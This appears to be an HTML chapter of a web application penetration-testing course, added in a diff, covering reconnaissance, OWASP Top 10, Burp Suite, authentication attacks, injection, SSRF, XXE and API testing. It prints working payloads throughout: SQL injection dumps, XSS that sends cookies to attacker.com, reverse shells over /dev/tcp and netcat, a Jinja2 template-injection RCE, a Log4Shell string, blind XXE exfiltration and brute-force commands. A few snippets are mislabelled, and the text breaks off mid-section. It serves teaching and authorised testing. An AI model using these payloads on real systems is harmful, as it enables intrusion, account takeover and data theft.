@@ -1,0 +1,966 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Part 2 — Web Application VAPT</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="breadcrumb">
+<a href="../index.html">🏠 Home</a> &rsaquo; <strong>Part 2 — Web Application VAPT</strong>
+</nav>
+
+<header class="part-header">
+<h1>🟡 PART 2 — WEB APPLICATION VAPT</h1>
+<p class="subtitle">The crown jewel of pentesting — 80% of engagements focus here.</p>
+<div class="chapters">
+<a href="#ch6"><span class="ch-num">6</span> Web App Security Fundamentals</a>
+<a href="#ch7"><span class="ch-num">7</span> OWASP Top 10 Deep Dive</a>
+<a href="#ch8"><span class="ch-num">8</span> Burp Suite Mastery</a>
+<a href="#ch9"><span class="ch-num">9</span> Authentication &amp; Session Attacks</a>
+<a href="#ch10"><span class="ch-num">10</span> Injection Attacks</a>
+<a href="#ch11"><span class="ch-num">11</span> Client-Side, SSRF &amp; XXE</a>
+<a href="#ch12"><span class="ch-num">12</span> API Security Testing</a>
+<a href="#ch13"><span class="ch-num">13</span> Business Logic Flaws</a>
+<a href="#ch14"><span class="ch-num">14</span> Real-Life Web Pentest Walkthrough</a>
+</div>
+</header>
+
+<main>
+
+<!-- =================== CH 6 =================== -->
+<h1 id="ch6">📖 Chapter 6 — Web Application Security Fundamentals</h1>
+
+<h2>6.1 Anatomy of a Web Request</h2>
+<div class="diagram">
+ANATOMY OF HTTP REQUEST
+═══════════════════════
+
+POST /api/v1/login HTTP/1.1                    ← Request line
+Host: target.com                                ← Headers
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: application/json
+Content-Type: application/json
+Authorization: Bearer eyJhbGc...
+X-Forwarded-For: 10.10.10.5
+Cookie: session=abc123; csrf_token=xyz789
+Referer: https://target.com/login
+Content-Length: 54                              ← End of headers (blank line)
+
+{                                               ← Body (JSON)
+  "username":"admin",
+  "password":"P@ssw0rd!"
+}
+
+─────────────────────────────────────────────────
+
+HTTP/1.1 200 OK                                 ← Response line
+Server: nginx/1.24
+Set-Cookie: session=def456; HttpOnly; Secure; SameSite=Strict
+X-Frame-Options: DENY
+Content-Security-Policy: default-src 'self'
+Content-Type: application/json
+Content-Length: 87
+
+{"status":"success","token":"eyJhbGc..."}
+</div>
+
+<h2>6.2 The Modern Web Attack Surface</h2>
+<div class="diagram">
+   ┌────────────────────────────────────────────────────────┐
+   │                 MODERN WEB ATTACK SURFACE              │
+   ├──────────────┬───────────────┬─────────────────────────┤
+   │   CLIENT     │   CHANNELS    │    SERVER-SIDE          │
+   ├──────────────┼───────────────┼─────────────────────────┤
+   │ • HTML       │ • HTTP/HTTPS  │ • Application logic     │
+   │ • JavaScript │ • WebSockets  │ • Database (SQL/NoSQL)  │
+   │ • CSS        │ • GraphQL     │ • Authentication layer  │
+   │ • Cookies    │ • REST / SOAP │ • File system / uploads │
+   │ • LocalStor. │ • gRPC        │ • API Gateway           │
+   │ • ServiceWrk │ • ServerSent  │ • Serverless functions  │
+   │ • WebAssembly│ • WebRTC      │ • Microservices         │
+   │ • PostMsgs   │ • DNS rebind  │ • Third-party SDKs      │
+   │ • Iframes    │ • OpenRedir   │ • Cache / CDN / WAF     │
+   └──────────────┴───────────────┴─────────────────────────┘
+</div>
+
+<h2>6.3 Reconnaissance by Proxying Traffic</h2>
+<h3>6.3.1 Burp Suite — Your Daily Driver</h3>
+<pre><code class="cmd"># Launch Burp
+$ burpsuite                       # Community
+$ java -jar burpsuite_community.jar
+
+# Browser → FoxyProxy → 127.0.0.1:8080
+# In Burp: Proxy → Intercept → ON
+
+# Steps:
+# 1. Install Burp CA cert in browser
+#    Visit http://burp → "CA Certificate" → Save → import to Firefox
+# 2. Browse app — all traffic captured in HTTP History
+# 3. Target tab → Site Map builds sitemap automatically
+</code></pre>
+
+<h2>6.4 Fingerprinting the Tech Stack</h2>
+<pre><code class="cmd">$ whatweb https://target.com
+$ wappalyzer                    # Browser extension
+$ nmap -sV -p 80,443 target.com
+$ curl -I https://target.com | head -20
+</code></pre>
+
+<h2>6.5 Discovering Hidden Endpoints</h2>
+<pre><code class="cmd"># 1. Ffuf — fast web fuzzer
+$ ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302
+
+# 2. With extensions
+$ ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.html,.bak,.git
+
+# 3. Subdomain discovery first
+$ subfinder -d target.com -silent | sort -u &gt; subs.txt
+$ cat subs.txt | httpx -status-code -silent -o live.txt
+
+# 4. Wayback Machine — old forgotten endpoints
+$ curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/*&amp;output=json&amp;fl=original" | jq -r '.[1:] | .[0]' | sort -u
+</code></pre>
+
+<h2>6.6 Reading HTTP Headers Like a Pentester</h2>
+<table>
+<tr><th>Header</th><th>What to Check</th><th>Risk if Missing</th></tr>
+<tr><td>Strict-Transport-Security</td><td>max-age ≥ 1 year, includeSubDomains</td><td>SSL stripping attacks</td></tr>
+<tr><td>Content-Security-Policy</td><td>default-src 'self'; no 'unsafe-inline'</td><td>XSS amplification</td></tr>
+<tr><td>X-Frame-Options / frame-ancestors</td><td>DENY or SAMEORIGIN</td><td>Clickjacking</td></tr>
+<tr><td>X-Content-Type-Options</td><td>nosniff</td><td>MIME sniffing → XSS</td></tr>
+<tr><td>Referrer-Policy</td><td>strict-origin-when-cross-origin</td><td>URL leaks</td></tr>
+<tr><td>Permissions-Policy</td><td>Restrict camera/mic/geolocation</td><td>Privacy leaks</td></tr>
+<tr><td>Cache-Control</td><td>no-store on sensitive pages</td><td>Cache poisoning</td></tr>
+<tr><td>Server / X-Powered-By</td><td>Removed or generic</td><td>Information disclosure</td></tr>
+<tr><td>Set-Cookie</td><td>HttpOnly, Secure, SameSite=Strict</td><td>Session theft, CSRF</td></tr>
+</table>
+
+<h2>6.7 Real-Life Scenario: Missing CSP Saved a Hacker $0</h2>
+<div class="scenario">
+<h3>📍 Scenario — Banking App Had Perfect TLS but a Single Missing CSP</h3>
+<p>A banking portal used HSTS, perfect TLS, and Frame-Ancestors 'none'. Yet a tiny XSS in a
+search box leaked session cookies because the app never set <code>HttpOnly</code> on one
+specific <code>auth_token</code> cookie. The attacker didn't even need CSP bypass!
+Reports were closed without credit because critical defense headers were absent.</p>
+
+<p><strong>Lesson:</strong> Defense in depth matters — never rely on a single control.</strong></p>
+</div>
+
+
+<!-- =================== CH 7 =================== -->
+<h1 id="ch7">📊 Chapter 7 — OWASP Top 10 (2021/2025) Deep Dive</h1>
+
+<table>
+<tr><th>#</th><th>Category</th><th>AppPlex Insight</th></tr>
+<tr><td>A01</td><td>Broken Access Control</td><td>#1 cause of breaches (94% of apps)</td></tr>
+<tr><td>A02</td><td>Cryptographic Failures</td><td>Plaintext, weak algorithms, missing TLS</td></tr>
+<tr><td>A03</td><td>Injection (SQLi, XSS, cmd)</td><td>Still #3 — never trust user input</td></tr>
+<tr><td>A04</td><td>Insecure Design</td><td>Lack of threat modeling at design phase</td></tr>
+<tr><td>A05</td><td>Security Misconfiguration</td><td>Default creds, verbose errors, open admin</td></tr>
+<tr><td>A06</td><td>Vulnerable &amp; Outdated Components</td><td>CVE-2021-44228 (Log4Shell) impact</td></tr>
+<tr><td>A07</td><td>Identification &amp; Auth Failures</td><td>Weak passwords, session fixation</td></tr>
+<tr><td>A08</td><td>Software &amp; Data Integrity</td><td>Insecure deserialization, supply chain</td></tr>
+<tr><td>A09</td><td>Security Logging &amp; Monitoring</td><td>Average **277 days** to detect!</td></tr>
+<tr><td>A10</td><td>SSRF (Server-Side Request Forgery)</td><td>Climbed from #36 → #10 in 4 years</td></tr>
+</table>
+
+<h2>7.1 A01 — Broken Access Control — Real Examples</h2>
+<pre><code class="cmd"># ❶ IDOR (Insecure Direct Object Reference)
+# Normal: /api/users/1234/profile  → returns YOUR profile
+# IDOR:   /api/users/1235/profile  → returns SOMEONE ELSE'S profile
+
+# Test cycle:
+# - Create User A and User B with our own creds
+# - Note User A's order URL: /api/orders/ORD-9001
+# - Replace with Ord-9000, 9002, etc.
+# - 200 OK + different data = IDOR vuln
+
+# ❷ Privilege escalation by parameter tampering
+# URL: /admin/dashboard   →  403
+# Hmm, change cookie group: "user" → "admin"
+# Now: /admin/dashboard  →  200 OK
+
+# ❸ JWT alg=none bypass (CRITICAL CLASSIC)
+# Original JWT:
+# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
+# Replace header: 
+# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 . eyJ1c2VyIjoiYWRtaW4ifQ.
+# (empty signature) — server MUST accept!
+
+# ❹ Path traversal
+# /download?file=report.pdf              ← legit
+# /download?file=../../../../etc/shadow  ← read shadow file
+</code></pre>
+
+<div class="box danger">
+<strong>⚠ Found in 94% of applications tested.</strong> This is the bread &amp; butter of
+every pentester. Always test access controls early in the engagement.
+</div>
+
+<h2>7.2 A02 — Cryptographic Failures</h2>
+<ul>
+  <li>HTTP (no TLS) → entire site readable</li>
+  <li>SSLv3 / TLS 1.0 / 1.1 → POODLE, BEAST</li>
+  <li>CB-C mode with weak MAC</li>
+  <li>MD5 / SHA-1 password hashing → cracked in seconds</li>
+  <li>Hardcoded keys in source code</li>
+  <li>Customer passwords not salted</li>
+  <li>Sensitive data in URLs (logs, browser history)</li>
+  <li>Missing Strict-Transport-Security</li>
+</ul>
+
+<pre><code class="cmd"># Tools
+$ testssl.sh https://target.com
+$ sslyze https://target.com
+$ nmap --script ssl-enum-ciphers,ssl-cert -p 443 target.com
+
+# Identify hash type
+$ hashid '5f4dcc3b5aa765d61d8327deb882cf99'   # md5
+$ hashid '$2y$10$...'                          # bcrypt
+
+# Crack
+$ hashcat -m 0 hash.txt rockyou.txt       # MD5
+$ john --format=bcrypt hash.txt --wordlist=rockyou.txt
+</code></pre>
+
+<h2>7.3 A03 — Injection Attacks</h2>
+<table>
+<tr><th>Type</th><th>Where</th><th>Classic Payload</th></tr>
+<tr><td>SQL Injection</td><td>Login, search, URL params</td><td><code>' OR '1'='1</code></td></tr>
+<tr><td>NoSQL Injection</td><td>MongoDB queries</td><td><code>{"$gt":""}</code></td></tr>
+<tr><td>LDAP Injection</td><td>Active Directory queries</td><td><code>*(|(uid=*))</code></td></tr>
+<tr><td>XPath Injection</td><td>XML data store</td><td><code>' or '1'='1</code></td></tr>
+<tr><td>OS Command Inj.</td><td>Ping/traceroute features</td><td><code>; cat /etc/passwd</code></td></tr>
+<tr><td>Template Injection</td><td>Server-side templates</td><td><code>{{7*7}}</code> → 49</td></tr>
+<tr><td>XSS (Reflected/Stored/DOM)</td><td>Any text input</td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
+</table>
+
+<h2>7.4 A06 — Vulnerable &amp; Outdated Components</h2>
+<div class="callout">
+<div class="callout-title">REAL-WORLD: LOG4SHELL (Log4j CVE-2021-44228)</div>
+<p>Estimated <strong>$30+ BILLION</strong> in damages worldwide. Every Java app using
+log4j-core 2.0-beta9 to 2.14.1 was affected by a single 9-line JNDI exploit:</p>
+
+<pre><code class="cmd"># The exploit:
+# A user logs in with username:
+${jndi:ldap://attacker.com/Exploit}
+
+# Server evaluates → makes LDAP query to attacker.com → 
+# Receives malicious Java class → RCE as the app user.
+
+# Detection
+$ nuclei -t cves/2021/CVE-2021-44228.yaml -l urls.txt
+$ ./log4j-scan https://target.com
+</code></pre>
+</div>
+
+
+<h2>7.5 A10 — SSRF (Server-Side Request Forgery)</h2>
+<pre><code class="cmd"># Classic URL parameter for image upload:
+POST /api/v1/upload
+{ "image_url": "http://169.254.169.254/latest/meta-data/" }
+
+# In AWS — this returns EC2 metadata including IAM creds!
+
+# Test:
+# 1. file:// — local file read
+file:///etc/passwd
+
+# 2. HTTP to internal service
+http://localhost:8080/admin
+
+# 3. Cloud metadata
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# 4. Bypass blacklists
+http://target.com@169.254.169.254      # @ confusion
+http://[::1]/admin                     # IPv6 localhost  
+http://2130706433/                     # decimal IP for 127.0.0.1
+http://017700000001/                   # octal IP
+http://localtest.me                    # DNS to 127.0.0.1
+</code></pre>
+
+<h2>7.6 Real-Life Scenario — Healthcare App Vulnerabilities</h2>
+<div class="scenario">
+<h3>📍 Scenario: "HealthPlix" MediCare App — 7 Critical Findings in 5 days</h3>
+<ol>
+<li><span class="cvss">CVSS 9.8</span> SQLi in appointment search → dump entire patient DB</li>
+<li><span class="cvss">CVSS 9.1</span> IDOR on prescription download URL → download any patient's Rx</li>
+<li><span class="cvss">CVSS 8.6</span> Stored XSS in doctor notes → cookie theft of all admin sessions</li>
+<li><span class="cvss">CVSS 8.1</span> Outdated jQuery 1.6.2 prototype pollution</li>
+<li><span class="cvss">CVSS 7.5</span> Verbose error stack traces reveal internal IPs</li>
+<li><span class="cvss">CVSS 6.8</span> Password stored as MD5 without salt</li>
+<li><span class="cvss">CVSS 5.3</span> Missing rate-limiting → credential stuffing possible</li>
+</ol>
+
+<p><strong>Imagine</strong> 200,000 patient records exposed. HIPAA fines would exceed $20M.
+The pentest quote was <strong>$8K</strong>. <strong>ROI: 25,000x</strong>.</p>
+</div>
+
+
+<!-- =================== CH 8 =================== -->
+<h1 id="ch8">🛠 Chapter 8 — Burp Suite Mastery</h1>
+
+<h2>8.1 Burp Editions Compared</h2>
+<table>
+<tr><th>Edition</th><th>Price</th><th>Capabilities</th></tr>
+<tr><td>Community</td><td>FREE</td><td>Proxy, Repeater, Intruder (rate-limited), Decoder</td></tr>
+<tr><td>Pro</td><td>~$449/year</td><td>+ Scanner, Crawler, Save state, unlimited Intruder</td></tr>
+<tr><td>Enterprise</td><td>$$$</td><td>Continuous scanning + CI/CD integration</td></tr>
+</table>
+
+<h2>8.2 Burp Repeater — Your Single Most Used Tool</h2>
+<pre><code class="cmd"># Send any request from HTTP History:
+# Right-click → Send to Repeater
+# Modify params / headers / body
+# Click GO and read response
+# Iterate forever
+
+# Example: Testing for SQLi in a login form
+POST /login HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+username=admin'--&amp;password=anything
+</code></pre>
+
+<h2>8.3 Burp Intruder — Fuzzing</h2>
+<pre><code class="cmd"># Use case 1: Brute-force login
+# Payload positions: §username§
+# Payload: usernames.txt (admin, root, administrator...)
+
+# Use case 2: Fuzz parameter for IDOR
+# Position: §order_id§ in /api/orders/§order_id§
+# Payload: numbers 1-10000
+
+# Use case 3: Fuzz for SQLi-XSS
+# Position: §q§ in /search?q=§q§
+# Payload: SQLi-XSS-Fuzz.txt
+
+# Use case 4: Credential stuffing
+# Positions: §username§ and §password§
+# Payload 1: leaked_emails.txt
+# Payload 2: rockyou.txt
+
+# Tip: Use "Pitchfork" or "Cluster bomb" attack types
+</code></pre>
+
+<h2>8.4 Burp Extensions (BApps Store)</h2>
+<table>
+<tr><th>Extension</th><th>Purpose</th><th>Must-Have?</th></tr>
+<tr><td>Logger++</td><td>Advanced request logging w/ filters</td><td>⚡ Yes</td></tr>
+<tr><td>Autorize</td><td>Auto-detect Broken Access Control</td><td>⚡ Yes</td></tr>
+<tr><td>Param Miner</td><td>Find hidden parameters</td><td>⚡ Yes</td></tr>
+<tr><td>JWT Editor</td><td>Manipulate JWTs</td><td>⚡ Yes</td></tr>
+<tr><td>Collaborator Everywhere</td><td>Find blind SSRF / XXE / RCE</td><td>⚡ Yes</td></tr>
+<tr><td>Active Scan++</td><td>Extra scanner checks</td><td>✓</td></tr>
+<tr><td>Retire.js</td><td>Detect vulnerable JS libs</td><td>✓</td></tr>
+<tr><td>Software Vulnerability Scanner</td><td>CVE checks in responses</td><td>✓</td></tr>
+<tr><td>Upload Scanner</td><td>File upload bypasses</td><td>✓</td></tr>
+<tr><td>Turbo Intruder</td><td>Speed-fuzz without rate-limit</td><td>⚡ Yes</td></tr>
+</table>
+
+<h2>8.5 Burp Macros &amp; Session Handling</h2>
+<pre><code class="cmd"># Problem: CSRF token changes each request → Intruder fails
+
+# Solution 1: Record Login Macro
+# Project options → Sessions → Add cookie jar
+# Macro: 1. GET /login  2. POST /login  → response sets new session
+# Macros run automatically before each Intruder request
+
+# Solution 2: Pitchfork match-and-replace
+# Match the new CSRF token from login response, replace in payload
+</code></pre>
+
+
+<!-- =================== CH 9 =================== -->
+<h1 id="ch9">🔐 Chapter 9 — Authentication &amp; Session Attacks</h1>
+
+<h2>9.1 Authentication Test Checklist</h2>
+<ul class="checklist">
+<li>Does password complexity apply?</li>
+<li>Is there rate-limiting on login?</li>
+<li>Can I enumerate users via response timing / message change?</li>
+<li>Does password reset flow leak tokens?</li>
+<li>Is "remember me" token predictable?</li>
+<li>Are credentials transmitted in cleartext anywhere?</li>
+<li>Is the session token cryptographically strong?</li>
+<li>Does session expire on logout?</li>
+<li>Does session expire after inactivity?</li>
+<li>Can I log in from multiple devices (parallel sessions)?</li>
+<li>Is multi-factor authentication bypassable?</li>
+</ul>
+
+<h2>9.2 Password Complexity &amp; Bruteforce</h2>
+<pre><code class="cmd"># Hydra online brute-force
+$ hydra -L users.txt -P rockyou.txt target.com https-post-form "/login:username=^USER^&amp;password=^PASS^:Invalid login"
+
+# Patator — smarter brute-force
+$ patator http_fuzz url=http://target.com/login \
+  body='username=admin&amp;password=FILE0' \
+  0=rockyou.txt before_urls=http://target.com/login
+</code></pre>
+
+<h2>9.3 User Enumeration Techniques</h2>
+<pre><code class="cmd"># 1) Response message: "Invalid username" vs "Invalid password"
+# 2) Timing difference: valid user → checks hash → ~200 ms
+#                        invalid user → fails lookup faster → ~20 ms
+# 3) Response size differs
+# 4) Password reset flow leaks valid emails
+
+# Use wfuzz to mass-test:
+$ wfuzz -z users.txt -z rockyou.txt --hs "Invalid login" -d "username=FUZZ&amp;password=FUZ2Z" http://target.com/login
+</code></pre>
+
+<h2>9.4 JWT Attacks — A Pentester Goldmine</h2>
+<pre><code class="cmd"># JWT anatomy
+HEADER.PAYLOAD.SIGNATURE
+
+# Algorithm confusions
+
+# 1) alg: HS256 → RS256 confusion
+# Server: "I expect public RSA. Show me token signed with private."
+# Attacker: signs with HMAC using the public key (which he can read!)
+
+# 2) alg: none 
+# Replace alg header with "none", strip signature
+eyJhbGciOiJub25lIn0 . eyJ1c2VyIjoiYWRtaW4ifQ .
+
+# 3) Weak HMAC secret brute-force
+$ jwt_tool &lt;token&gt; -C -d rockyyou.txt -k
+
+# 4) Kid injection
+{"kid":"../../../../dev/null","alg":"HS256"}
+# Server reads signing key from /dev/null → empty → signs empty payload
+</code></pre>
+
+<h2>9.5 OAuth 2.0 Misconfigurations</h2>
+<pre><code class="cmd"># 1) Open redirect on redirect_uri
+https://auth.app/oauth/authorize?redirect_uri=http://attacker.com
+
+# 2) Code theft via referer leak
+# App uses: &lt;a href="..."&gt; with no referrer policy
+
+# 3) Scope escalation
+# Token scope: "read:profile email"
+# Manipulate to: "admin:full"
+
+# 4) Authorization code reuse
+# Many apps accept same code twice
+</code></pre>
+
+<h2>9.6 SAML Attacks</h2>
+<pre><code class="cmd"># Comment stripping
+NSE: Assertion includes "admin" → signature valid because comment removed
+
+# XML signature wrapping
+# Place original signed assertion inside unsigned wrapper
+# Server validates signature but trusts unsigned data
+
+# Tools
+$ samltester
+$ ./SAMLDeathStar.py
+</code></pre>
+
+
+<!-- =================== CH 10 =================== -->
+<h1 id="ch10">💉 Chapter 10 — Injection Attacks Masterclass</h1>
+
+<h2>10.1 SQL Injection Deep Dive</h2>
+<h3>10.1.1 Detection</h3>
+<pre><code class="cmd"># Classic string-based SQLi
+' OR '1'='1                              # Always-true
+' OR 1=1--                                # Comment out rest
+admin'--                                   # Admin bypass
+"></code></pre>
+
+<h3>10.1.2 Union-Based</h3>
+<pre><code class="cmd"># Step 1: Determine column count
+' ORDER BY 1--  ' OK
+' ORDER BY 2--  ' OK
+' ORDER BY 3--  ' ERROR  → 2 columns
+
+# Step 2: UNION SELECT
+' UNION SELECT NULL,NULL--
+' UNION SELECT user(),version()--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+# Grab all users
+' UNION SELECT username,password FROM users--   # if 2 cols
+' UNION SELECT username,0x3a,password FROM users--  # if 3 cols
+</code></pre>
+
+<h3>10.1.3 Blind (Boolean &amp; Time)</h3>
+<pre><code class="cmd"># Boolean-based
+' AND 1=1--    → Page renders normally
+' AND 1=2--    → Page changes/renders empty
+
+# Time-based
+' OR SLEEP(5)--            # MySQL
+';WAITFOR DELAY '0:0:5'--  # MSSQL
+' AND SLEEP(5)--           # Generic
+' OR pg_sleep(5)--         # PostgreSQL
+' AND 1=dbms_pipe.receive_message('a',5)--   # Oracle
+
+# Faster blind SQLi → use conditional errors
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+</code></pre>
+
+<h3>10.1.4 sqlmap — Automation</h3>
+<pre><code class="cmd"># Detection → exploit
+$ sqlmap -u "http://target.com/item?id=1" --dbs
+
+# Authenticated
+$ sqlmap -u "http://target.com/item?id=1" --cookie="session=abc" --dbs
+
+# POST request
+$ sqlmap -r post.txt --dbs
+
+# Aggressive, get shell
+$ sqlmap -r post.txt --os-shell --batch
+</code></pre>
+
+<h2>10.2 Cross-Site Scripting (XSS)</h2>
+<h3>10.2.1 Reflected XSS</h3>
+<pre><code class="cmd"># Payload (try in search box)
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+
+# Bypasses
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;
+&lt;img ""&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;a/href="javascript:alert(1)"&gt;click
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+%3Cscript%3Ealert(1)%3C/script%3E
+&#60;script&#62;alert(1)&#60;/script&#62;
+</code></pre>
+
+<h3>10.2.2 Stored XSS — More Dangerous</h3>
+<p>Stored in database → affects every user who views the page (profile comments, support
+tickets, blog post titles, profile names, file upload names...).</p>
+
+<pre><code class="cmd"># Cookie-stealing payload (if HttpOnly missing)
+&lt;script&gt;new Image().src='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;
+
+# Modern alternative (fetch)
+&lt;script&gt;fetch(`https://attacker.com/x?`+document.cookie)&lt;/script&gt;
+
+# Real attack chain:
+# 1) Inject XSS in comment
+# 2) Admin views comment → cookie sent to attacker
+# 3) Attacker replays admin cookie → full takeover
+</code></pre>
+
+<h3>10.2.3 DOM-Based XSS</h3>
+<pre><code class="cmd"># Searching for taint flow from URL → JS execution
+# Vulnerable JS:
+var search = location.hash.substring(1);
+document.write("Results for: " + search);
+
+# Attack URL:
+https://target.com/#&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+
+<h2>10.3 OS Command Injection</h2>
+<pre><code class="cmd"># Detection
+; ls       # Semicolon chain
+| whoami   # Pipe
+`id`       # Backtick
+$(whoami)  # Subshell
+
+# Bypass filters with newlines (%0a)
+%0aid
+%0awhoami
+
+# Get a reverse shell
+; bash -i >&amp; /dev/tcp/10.10.10.5/4444 0>&amp;1
+; nc 10.10.10.5 4444 -e /bin/sh
+</code></pre>
+
+<h2>10.4 Server-Side Template Injection (SSTI)</h2>
+<pre><code class="cmd"># Polyglot payload that works against multiple engines
+${{7*7}}          # Jinja2 (Python)
+{{7*7}}           # Twig (PHP), Smarty (Wait: {php} echo 7*7; {/php})
+#{7*7}            # Ruby on Rails ERB
+&lt;#assign x="7*7"&gt;${7*7}  # Freemarker
+${{7*7}} ${7*7} &lt;%= 7*7 %&gt;  # Polyglot
+
+# Jinja2 RCE
+{{ ''.__class__.__mro__[1].__subclasses__()|attr('__getitem__')(396)('cat /etc/passwd',shell=True,stdout=-1).communicate() }}
+
+# Confirmation: ${7*7} returns "49" → SSTI confirmed
+</code></pre>
+
+<h2>10.5 NoSQL Injection (MongoDB)</h2>
+<pre><code class="cmd"># JSON body
+POST /api/login
+Content-Type: application/json
+
+{
+  "username": {"$gt": ""},
+  "password": {"$gt": ""}
+}
+# Returns first user (often admin)
+
+# JavaScript injection (older Mongo)
+{"username": "admin", "password": {"$where": "this.password.match(/.*/)"}}
+</code></pre>
+
+<h2>10.6 Real-Life Scenario — SQLi Saved a SaaS Company $2M</h2>
+<div class="scenario">
+<h3>📍 Scenario: SaaS Helpdesk Tool "ZohoDesk-CA"</h3>
+<p>A junior tester found a time-based SQLi in the search field. 4-second delay confirmed.
+Within 2 hours, the entire 600GB customer database was extracted. The CTO was furious but
+grateful — remediation cost $25K, but a breach in production would have cost $2.5M
+in regulatory fines (GDPR × 50K records × €20 per record).</p>
+<p><strong>Lesson: A single missed input validation can bankrupt a company. Defense code
+review matters.</strong></p>
+</div>
+
+
+<!-- =================== CH 11 =================== -->
+<h1 id="ch11">🎯 Chapter 11 — Client-Side, SSRF &amp; XXE</h1>
+
+<h2>11.1 XML External Entity (XXE)</h2>
+<pre><code class="cmd"># Vulnerable XML parser &amp; Classic file read payload:
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE data [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+
+# SSRF via XXE
+&lt;!ENTITY xxe SYSTEM "http://internal.target:8080/admin"&gt;
+
+# Out-of-band data exfiltration (blind XXE)
+&lt;!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"&gt;
+%remote;
+%intern;
+%trick;
+
+# Tools
+$ python3 xxe-lab.py
+$ cat https://github.com/luisfontes19/xxexploiter
+</code></pre>
+
+<h2>11.2 SSRF Bypass Techniques</h2>
+<pre><code class="cmd"># IP representations of 169.254.169.254:
+# Decimal:    http://169.254.169.254/
+# Octal:      http://0251.0376.0251.0376/
+# Hex:        http://0xa9.0xfe.0xa9.0xfe/
+# Combined:   http://0xa9fea9fe/
+
+# Domain tricks
+http://localhost.target.com      # subdomain
+http://localtest.me
+http://127.1/                    # Short form
+http://[::]/                     # IPv6 loopback
+http://example.com#@127.0.0.1    # @ confusion
+http://127.0.0.1%00.target.com   # Null byte
+http://attacker.com/redirector/  # Custom redirector
+</code></pre>
+
+<h2>11.3 Real-World SSRF Threat — Capital One Breach</h2>
+<div class="scenario">
+<h3>📍 Scenario: Capital One — $190M Fine (2019)</h3>
+<p>A former AWS employee exploited SSRF in a misconfigured ModSecurity WAF to query the
+EC2 metadata service. The WAF's IAM role had overly broad S3 read permissions,
+granting access to 106M customer records including SSNs and bank account numbers.</p>
+
+<p><strong>Attack flow:</strong></p>
+<div class="diagram">
+   Attacker                                          
+       │                                              
+       ▼                                              
+   POST / (malicious URL in parameter)                
+       │                                              
+       ▼                                              
+   WAF EC2 instance receives request                 
+       │                                              
+       ▼                                              
+   WAF fetches: http://169.254.169.254/latest/...    
+       │                                              
+       ▼                                              
+   EC2 metadata → IAM cred returned to WAF           
+       │                                              
+       ▼                                              
+   WAF creds used to dump S3 bucket                  
+</div>
+
+<p>Lesson: Always restrict SSRF targets &amp; apply least-privilege IAM roles.</p>
+</div>
+
+
+<!-- =================== CH 12 =================== -->
+<h1 id="ch12">🔗 Chapter 12 — API Security Testing</h1>
+
+<h2>12.1 REST API Pentest Methodology</h2>
+<pre><code class="cmd"># Step 1: Get the API spec (Swagger / OpenAPI / RAML)
+$ curl https://api.target.com/v1/swagger.json
+$ curl https://api.target.com/openapi.json
+
+# Step 2: Map all endpoints &amp; parameters
+# Use: Burp Target → Site Map → filter "api."
+
+# Step 3: For each endpoint, test:
+# - AuthN: Can unauthenticated user access?
+# - AuthZ: Can User A see User B's resources?
+# - Input validation: SQL/XSS/JSON injection
+# - Rate limiting
+# - Verbose errors
+# - HTTP method tampering (GET → DELETE on read endpoint?)
+</code></pre>
+
+<h2>12.2 GraphQL Pentesting</h2>
+<pre><code class="cmd"># Discover: graphql endpoint usually /graphql or /api/graphql
+
+# Introspection query (often unrestricted!)
+{
+  __schema {
+    types {
+      name
+      fields { name type { name } }
+    }
+  }
+}
+# → Full API map!
+
+# Access control via introspection
+# Often: query usersPassword:String returns plaintext!
+
+# Tools
+$ graphql-voyager  # Visualize schema
+$ cli-graphql
+$ InQL (Burp extension)
+
+# Forced browsing attacks
+# Query: { user(id: 1) { } } — try id: 2,3,4...
+</code></pre>
+
+<h2>12.3 API Top 10 (OWASP 2023)</h2>
+<table>
+<tr><th>#</th><th>Risk</th></tr>
+<tr><td>API1</td><td>Broken Object-Level Authorization (BOLA)</td></tr>
+<tr><td>API2</td><td>Broken Authentication</td></tr>
+<tr><td>API3</td><td>Broken Object Property-Level Auth (mass assignment)</td></tr>
+<tr><td>API4</td><td>Unrestricted Resource Consumption</td></tr>
+<tr><td>API5</td><td>Broken Function-Level Auth</td></tr>
+<tr><td>API6</td><td>Unrestricted Access to Sensitive Business Flows</td></tr>
+<tr><td>API7</td><td>Server-Side Request Forgery</td></tr>
+<tr><td>API8</td><td>Security Misconfiguration</td></tr>
+<tr><td>API9</td><td>Improper Inventory Management (shadow APIs)</td></tr>
+<tr><td>API10</td><td>Unsafe Consumption of APIs</td></tr>
+</table>
+
+<h2>12.4 Mass Assignment (API3)</h2>
+<pre><code class="cmd"># Attacker observes body expects:
+{ "username": "alice", "email": "alice@x.com" }
+
+# Sends extra params hoping server blindly accepts:
+{
+  "username": "alice",
+  "email": "alice@x.com",
+  "isAdmin": true,        # if model allows
+  "role": "admin",
+  "balance": 999999
+}
+
+# Bank example (real case):
